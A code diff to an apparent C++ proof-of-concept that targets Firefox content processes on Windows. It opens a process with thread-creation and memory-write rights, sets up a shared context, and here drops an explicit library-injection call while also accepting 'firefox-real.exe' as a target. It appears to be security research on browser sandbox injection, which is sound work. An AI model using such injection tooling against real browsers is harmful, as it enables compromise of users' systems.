@@ -664,6 +664,7 @@ LaunchContext RunInjectedPoc(DWORD pid, const std::wstring& dll_path,
                              const std::wstring& notification_profile,
                              const std::wstring& background_task_name,
                              const std::wstring& application_user_model_id) {
+  (void)dll_path;
   (void)local_dll_path;
   const DWORD access = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                        PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_OPERATION |
@@ -677,6 +678,7 @@ LaunchContext RunInjectedPoc(DWORD pid, const std::wstring& dll_path,
   context.magic = kPocContextMagic;
   context.state = 0;
   context.bootstrap_result = ERROR_IO_PENDING;
+  context.target_pid = pid;
   context.call_hresult = E_PENDING;
   context.extended_error = E_PENDING;
   context.launch_result = -1;
@@ -761,8 +763,6 @@ LaunchContext RunInjectedPoc(DWORD pid, const std::wstring& dll_path,
   MemoryBarrier();
   InterlockedExchange(&shared_context->state, kPocContextReady);
 
-  InjectLibrary(process.get(), pid, dll_path);
-
   bool complete = false;
   for (int attempt = 0; attempt < 2400; ++attempt) {
     if (InterlockedCompareExchange(&shared_context->state,
@@ -838,7 +838,9 @@ std::string HexHresult(LONG value) {
 
 void VerifyFirefoxContentProcess(const TokenSnapshot& snapshot,
                                  const std::wstring& expected_family) {
-  if (_wcsicmp(BaseName(snapshot.image_path).c_str(), L"firefox.exe") != 0) {
+  const std::wstring image_name = BaseName(snapshot.image_path);
+  if (_wcsicmp(image_name.c_str(), L"firefox.exe") != 0 &&
+      _wcsicmp(image_name.c_str(), L"firefox-real.exe") != 0) {
     throw std::runtime_error("target image is not firefox.exe");
   }
   const std::wstring command_line = ToLower(snapshot.command_line);
